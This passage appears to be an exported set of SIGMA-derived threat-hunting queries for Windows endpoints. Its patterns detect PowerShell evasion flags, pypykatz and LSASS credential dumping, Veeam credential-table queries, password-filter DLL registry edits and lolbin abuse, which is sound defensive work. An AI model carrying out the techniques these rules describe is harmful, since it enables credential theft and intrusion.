            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "In Kaspersky's 2020 Incident Response Analyst Report they listed legitimate tool \"Mouse Lock\" as being used for both credential access and collection in security incidents.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1056"
            ],
            "name": "PUA - Mouse Lock Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName contains \"Mouse Lock\" or tgt.process.publisher contains \"Misc314\" or tgt.process.cmdline contains \"Mouse Lock_\")) | columns tgt.process.displayName,tgt.process.publisher,tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 735
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious PowerShell invocation with a parameter substring",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious PowerShell Parameter Substring",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \" -windowstyle h \" or tgt.process.cmdline contains \" -windowstyl h\" or tgt.process.cmdline contains \" -windowsty h\" or tgt.process.cmdline contains \" -windowst h\" or tgt.process.cmdline contains \" -windows h\" or tgt.process.cmdline contains \" -windo h\" or tgt.process.cmdline contains \" -wind h\" or tgt.process.cmdline contains \" -win h\" or tgt.process.cmdline contains \" -wi h\" or tgt.process.cmdline contains \" -win h \" or tgt.process.cmdline contains \" -win hi \" or tgt.process.cmdline contains \" -win hid \" or tgt.process.cmdline contains \" -win hidd \" or tgt.process.cmdline contains \" -win hidde \" or tgt.process.cmdline contains \" -NoPr \" or tgt.process.cmdline contains \" -NoPro \" or tgt.process.cmdline contains \" -NoProf \" or tgt.process.cmdline contains \" -NoProfi \" or tgt.process.cmdline contains \" -NoProfil \" or tgt.process.cmdline contains \" -nonin \" or tgt.process.cmdline contains \" -nonint \" or tgt.process.cmdline contains \" -noninte \" or tgt.process.cmdline contains \" -noninter \" or tgt.process.cmdline contains \" -nonintera \" or tgt.process.cmdline contains \" -noninterac \" or tgt.process.cmdline contains \" -noninteract \" or tgt.process.cmdline contains \" -noninteracti \" or tgt.process.cmdline contains \" -noninteractiv \" or tgt.process.cmdline contains \" -ec \" or tgt.process.cmdline contains \" -encodedComman \" or tgt.process.cmdline contains \" -encodedComma \" or tgt.process.cmdline contains \" -encodedComm \" or tgt.process.cmdline contains \" -encodedCom \" or tgt.process.cmdline contains \" -encodedCo \" or tgt.process.cmdline contains \" -encodedC \" or tgt.process.cmdline contains \" -encoded \" or tgt.process.cmdline contains \" -encode \" or tgt.process.cmdline contains \" -encod \" or tgt.process.cmdline contains \" -enco \" or tgt.process.cmdline contains \" -en \" or tgt.process.cmdline contains \" -executionpolic \" or tgt.process.cmdline contains \" -executionpoli \" or tgt.process.cmdline contains \" -executionpol \" or tgt.process.cmdline contains \" -executionpo \" or tgt.process.cmdline contains \" -executionp \" or tgt.process.cmdline contains \" -execution bypass\" or tgt.process.cmdline contains \" -executio bypass\" or tgt.process.cmdline contains \" -executi bypass\" or tgt.process.cmdline contains \" -execut bypass\" or tgt.process.cmdline contains \" -execu bypass\" or tgt.process.cmdline contains \" -exec bypass\" or tgt.process.cmdline contains \" -exe bypass\" or tgt.process.cmdline contains \" -ex bypass\" or tgt.process.cmdline contains \" -ep bypass\" or tgt.process.cmdline contains \" /windowstyle h \" or tgt.process.cmdline contains \" /windowstyl h\" or tgt.process.cmdline contains \" /windowsty h\" or tgt.process.cmdline contains \" /windowst h\" or tgt.process.cmdline contains \" /windows h\" or tgt.process.cmdline contains \" /windo h\" or tgt.process.cmdline contains \" /wind h\" or tgt.process.cmdline contains \" /win h\" or tgt.process.cmdline contains \" /wi h\" or tgt.process.cmdline contains \" /win h \" or tgt.process.cmdline contains \" /win hi \" or tgt.process.cmdline contains \" /win hid \" or tgt.process.cmdline contains \" /win hidd \" or tgt.process.cmdline contains \" /win hidde \" or tgt.process.cmdline contains \" /NoPr \" or tgt.process.cmdline contains \" /NoPro \" or tgt.process.cmdline contains \" /NoProf \" or tgt.process.cmdline contains \" /NoProfi \" or tgt.process.cmdline contains \" /NoProfil \" or tgt.process.cmdline contains \" /nonin \" or tgt.process.cmdline contains \" /nonint \" or tgt.process.cmdline contains \" /noninte \" or tgt.process.cmdline contains \" /noninter \" or tgt.process.cmdline contains \" /nonintera \" or tgt.process.cmdline contains \" /noninterac \" or tgt.process.cmdline contains \" /noninteract \" or tgt.process.cmdline contains \" /noninteracti \" or tgt.process.cmdline contains \" /noninteractiv \" or tgt.process.cmdline contains \" /ec \" or tgt.process.cmdline contains \" /encodedComman \" or tgt.process.cmdline contains \" /encodedComma \" or tgt.process.cmdline contains \" /encodedComm \" or tgt.process.cmdline contains \" /encodedCom \" or tgt.process.cmdline contains \" /encodedCo \" or tgt.process.cmdline contains \" /encodedC \" or tgt.process.cmdline contains \" /encoded \" or tgt.process.cmdline contains \" /encode \" or tgt.process.cmdline contains \" /encod \" or tgt.process.cmdline contains \" /enco \" or tgt.process.cmdline contains \" /en \" or tgt.process.cmdline contains \" /executionpolic \" or tgt.process.cmdline contains \" /executionpoli \" or tgt.process.cmdline contains \" /executionpol \" or tgt.process.cmdline contains \" /executionpo \" or tgt.process.cmdline contains \" /executionp \" or tgt.process.cmdline contains \" /execution bypass\" or tgt.process.cmdline contains \" /executio bypass\" or tgt.process.cmdline contains \" /executi bypass\" or tgt.process.cmdline contains \" /execut bypass\" or tgt.process.cmdline contains \" /execu bypass\" or tgt.process.cmdline contains \" /exec bypass\" or tgt.process.cmdline contains \" /exe bypass\" or tgt.process.cmdline contains \" /ex bypass\" or tgt.process.cmdline contains \" /ep bypass\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 736
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious SQL queries using SQLCmd targeting the Veeam backup databases in order to steal information.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1005"
            ],
            "name": "Veeam Backup Database Suspicious Query",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\sqlcmd.exe\" and (tgt.process.cmdline contains \"VeeamBackup\" and tgt.process.cmdline contains \"From \")) and (tgt.process.cmdline contains \"BackupRepositories\" or tgt.process.cmdline contains \"Backups\" or tgt.process.cmdline contains \"Credentials\" or tgt.process.cmdline contains \"HostCreds\" or tgt.process.cmdline contains \"SmbFileShares\" or tgt.process.cmdline contains \"Ssh_creds\" or tgt.process.cmdline contains \"VSphereInfo\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 737
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of powershell scripts via Runscripthelper.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1202"
            ],
            "name": "Suspicious Runscripthelper.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\Runscripthelper.exe\" and tgt.process.cmdline contains \"surfacecheck\")) | columns tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 738
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "The .SettingContent-ms file type was introduced in Windows 10 and allows a user to create \"shortcuts\" to various Windows 10 setting pages. These files are simply XML and contain paths to various Windows 10 settings binaries.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1204",
                "t1566"
            ],
            "name": "Arbitrary Shell Command Execution Via Settingcontent-Ms",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \".SettingContent-ms\" and (not tgt.process.cmdline contains \"immersivecontrolpanel\"))) | columns ParentProcess,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 739
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "There is an option for a MS VS Just-In-Time Debugger \"vsjitdebugger.exe\" to launch specified executable and attach a debugger.\nThis option may be used adversaries to execute malicious code by signed verified binary.\nThe debugger is installed alongside with Microsoft Visual Studio package.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Malicious PE Execution by Microsoft Visual Studio Debugger",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\vsjitdebugger.exe\" and (not (tgt.process.image.path=\"*\\vsimmersiveactivatehelper*.exe\" or tgt.process.image.path contains \"\\devenv.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 740
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of \"pypykatz\" to obtain stored credentials. Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database through Windows registry where the SAM database is stored",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "HackTool - Pypykatz Credentials Dumping Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\pypykatz.exe\" or tgt.process.image.path contains \"\\python.exe\") and (tgt.process.cmdline contains \"live\" and tgt.process.cmdline contains \"registry\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 741
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of Gpg4win to decrypt files",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "File Decryption Using Gpg4win",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\gpg.exe\" or tgt.process.image.path contains \"\\gpg2.exe\") or tgt.process.displayName=\"GnuPG\u2019s OpenPGP tool\") and (tgt.process.cmdline contains \" -d \" and tgt.process.cmdline contains \"passphrase\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 742
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of \"rar\" to add files to an archive for potential compression. An adversary may compress data (e.g. sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1560"
            ],
            "name": "Files Added To An Archive Using Rar.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\rar.exe\" and tgt.process.cmdline contains \" a \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 743
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a \"Get-Process\" cmdlet and it's aliases on lsass process, which is in almost all cases a sign of malicious activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1552"
            ],
            "name": "PowerShell Get-Process LSASS",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Get-Process lsas\" or tgt.process.cmdline contains \"ps lsas\" or tgt.process.cmdline contains \"gps lsas\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 744
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of the SQLServer process. This could indicate potential RCE or SQL Injection.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505",
                "t1190"
            ],
            "name": "Suspicious Child Process Of SQL Server",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\sqlservr.exe\" and (tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\netstat.exe\" or tgt.process.image.path contains \"\\nltest.exe\" or tgt.process.image.path contains \"\\ping.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\systeminfo.exe\" or tgt.process.image.path contains \"\\tasklist.exe\" or tgt.process.image.path contains \"\\wsl.exe\")) and (not (src.process.image.path contains \"C:\\Program Files\\Microsoft SQL Server\\\" and src.process.image.path contains \"DATEV_DBENGINE\\MSSQL\\Binn\\sqlservr.exe\" and tgt.process.image.path=\"C:\\Windows\\System32\\cmd.exe\" and tgt.process.cmdline contains \"\\\"C:\\Windows\\system32\\cmd.exe\\\" \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 745
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects file execution using the msdeploy.exe lolbin",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Execute Files with Msdeploy.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"verb:sync\" and tgt.process.cmdline contains \"-source:RunCommand\" and tgt.process.cmdline contains \"-dest:runCommand\") and tgt.process.image.path contains \"\\msdeploy.exe\")) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 746
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects dropping of dll files in system32 that may be used to retrieve user credentials from LSASS",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1556"
            ],
            "name": "Dropping Of Password Filter DLL",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" and tgt.process.cmdline contains \"scecli\\0\" and tgt.process.cmdline contains \"reg add\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 747
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a potentially suspicious execution of a parent process located in the \"\\Users\\Public\" folder executing a child process containing references to shell or scripting binaries and commandlines.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564",
                "t1059"
            ],
            "name": "Potentially Suspicious Execution From Parent Process In Public Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \":\\Users\\Public\\\" and ((tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.cmdline contains \"bitsadmin\" or tgt.process.cmdline contains \"certutil\" or tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"wscript\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 748
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to environment variables related to ETW logging via the CommandLine.\nThis could indicate potential adversaries stopping ETW providers recording loaded .NET assemblies.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "ETW Logging Tamper In .NET Processes Via CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
